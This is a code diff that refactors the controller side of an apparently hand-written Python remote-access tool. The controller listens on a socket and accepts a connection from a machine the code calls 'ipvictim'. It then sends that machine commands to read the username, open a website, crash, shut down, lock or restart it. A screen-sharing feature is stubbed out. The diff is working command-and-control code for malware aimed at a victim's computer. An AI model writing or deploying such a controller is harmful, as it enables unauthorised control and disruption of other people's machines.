@@ -22,48 +22,56 @@ else:
 """
 
 def main():
-        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        address = (ip,port)
-        sock.bind(address)
-        sock.listen()
-        print("[+] listening")
-        conn, ipvictim = sock.accept()
-        print("[+] Connected")
+        conn = connect()
         while True:
             command = input(str("Command >> "))
             if command == "exit":
-                exit()
+                exit(conn, command)
             elif command == "username":
-                username()
+                username(conn, command)
             elif command == "screenshare":
-                screenshare()
+                screenshare(conn, command)
             elif command == "website":
-                website()
+                website(conn, command)
             elif command == "crash":
-                crash()
+                crash(conn, command)
             elif command == "shutdown":
-                shutdown()
+                shutdown(conn, command)
             elif command == "lock":
-                lock()
+                lock(conn, command)
             elif command == "restart":
-                restart()
+                restart(conn, command)
         conn.close()
 
-def exit():
+
+def connect():
+    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    address = (ip,port)
+    sock.bind(address)
+    sock.listen()
+    print("[+] listening")
+    conn, ipvictim = sock.accept()
+    print("[+] Connected")
+    return conn
+
+
+
+def exit(conn, command):
     conn.send(command.encode())
     exit()
 
 
 
-def username():
+def username(conn, command):
     conn.send(command.encode())
     newuser = conn.recv(1024)
     print(newuser.decode())
 
 
 
-def screenshare():
-    conn.send(command.encode())
+def screenshare(conn, command):
+    print("Not working yet")
+    """conn.send(command.encode())
     sock.close()
     conn.close()
     receiver = StreamingServer("192.168.178.59", 8080)
@@ -71,32 +79,32 @@ def screenshare():
     t.start()
     while input(" >> ") != "exit":
         continue
-    receiver.stop_server()
+    receiver.stop_server()"""
 
 
 
-def website():
+def website(conn, command):
     conn.send(command.encode())
     website = input("Website >> ")
     conn.send(website.encode())
 
 
 
-def crash():
+def crash(conn, command):
     conn.send(command.encode())
 
 
 
-def shutdown():
+def shutdown(conn, command):
     conn.send(command.encode())
 
 
 
-def lock():
+def lock(conn, command):
     conn.send(command.encode())
 
 
 
-def restart():
+def restart(conn, command):
     conn.send(command.encode())
 main()
